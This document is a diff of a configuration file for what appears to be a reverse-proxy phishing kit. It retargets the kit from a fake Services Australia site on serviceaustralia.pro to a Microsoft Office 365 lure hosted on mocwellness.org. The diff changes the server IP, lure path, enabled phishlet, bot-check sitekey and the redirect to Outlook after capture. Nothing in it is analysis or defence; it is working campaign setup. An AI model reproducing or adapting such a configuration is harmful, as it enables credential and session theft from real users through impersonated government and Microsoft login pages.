@@ -1,18 +1,18 @@
 blacklist_mode: unauth
 cookie_key: ""
-ip: 179.43.189.46
+ip: 209.159.155.110
 lures:
-    - hostname: ""
-      path: /Gukqthcl
-      redirect_url: ""
-      phishlet: gov
-      template: ""
-      ua_filter: ""
+    - hostname: mocwellness.org
       info: ""
-      og_title: ""
       og_desc: ""
       og_image: ""
+      og_title: ""
       og_url: ""
+      path: /YuGoGUSBC
+      phishlet: office
+      redirect_url: ""
+      template: ""
+      ua_filter: ""
 nkpbot_enabled: false
 ota_enabled: false
 proxy_address: ""
@@ -22,7 +22,8 @@ proxy_port: 0
 proxy_type: http
 proxy_username: ""
 redirect_key: vo
-server: serviceaustralia.pro
+redirect_url: https://outlook.office.com/mail/
+server: mocwellness.org
 simplebot_enabled: false
 site_domains:
     amazon: ""
@@ -46,8 +47,9 @@ site_domains:
     gend: ""
     github: ""
     glady: ""
+    godaddy: ""
     google: ""
-    gov: serviceaustralia.pro
+    gov: ""
     hightail: ""
     icloud: ""
     instagram: ""
@@ -58,7 +60,7 @@ site_domains:
     mail: ""
     mailgun: ""
     nsbank: ""
-    o365: ""
+    office: mocwellness.org
     outlook: ""
     ovh: ""
     payfit: ""
@@ -73,13 +75,12 @@ site_domains:
     stripe: ""
     tiktok: ""
     twitter: ""
-    xfinity: google2.com
+    xfinity: ""
     yahoo: ""
 sites_enabled:
-    - gov
+    - office
 turnstile_privkey: ""
-turnstile_sitekey: ""
+turnstile_sitekey: 0x4AAAAAADQjZDgz9ScgrZwr
 verification_key: mf
 verification_token: d88e
-webhook_telegram: 
 webhook_verbosity: 1
